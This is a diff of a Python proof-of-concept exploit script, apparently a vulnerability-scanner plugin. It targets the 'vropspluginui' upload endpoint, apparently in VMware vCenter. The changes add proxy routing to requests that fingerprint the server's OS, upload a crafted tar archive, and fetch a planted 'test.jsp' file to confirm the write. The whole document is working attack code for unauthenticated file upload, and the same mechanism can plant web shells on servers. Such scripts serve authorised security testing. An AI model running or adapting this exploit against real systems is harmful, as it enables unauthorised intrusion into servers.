@@ -2,13 +2,13 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-import requests.packages.urllib3
 import tarfile
 import io
+from Config.config_proxies import proxies
 from Config.config_requests import headers
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -45,13 +45,13 @@ def content_poc(target):
 # 判断系统类型1
 def ve_system(target):
     ve_url = target + '/Ui/vropspluginui/rest/services/uploadova'
-    res1 = requests.get(ve_url, headers=headers, verify=False, timeout=5)
+    res1 = requests.get(ve_url, headers=headers, verify=False, timeout=5,proxies=proxies)
     return res1.status_code
 
 # 判断系统类型2
 def ve_system_poc(target):
     vurl = target + '/ui/vropspluginui/rest/services/uploadova'
-    ve_res = requests.get(vurl, headers=headers, verify=False, timeout=5)
+    ve_res = requests.get(vurl, headers=headers, verify=False, timeout=5,proxies=proxies)
     if ve_res.status_code == 405:
         if ve_system(target) == ve_res.status_code:
             return "windows"
@@ -67,13 +67,13 @@ def poc(target):
     # 移动读写位置到最开始
     mem_string.seek(0)
     file = [('uploadFile', ('test.tar', mem_string.read(), 'application/x-tar'))]
-    res = requests.post(vurl, files=file, headers=headers, verify=False, timeout=5)
+    res = requests.post(vurl, files=file, headers=headers, verify=False, timeout=5,proxies=proxies)
     if "SUCCESS" in res.text:
         if system_type == "windows":
             poc_url = target + "/statsreport/test.jsp"
         elif system_type == "linux":
             poc_url = target + "/ui/resources/test.jsp"
-        res_1 = requests.get(poc_url, headers=headers, verify=False, timeout=5)
+        res_1 = requests.get(poc_url, headers=headers, verify=False, timeout=5,proxies=proxies)
         if res_1.status_code == 200 and "this is a friendly test" in res_1.text:
             result['poc'] = NAME
             result['vurl'] = vurl
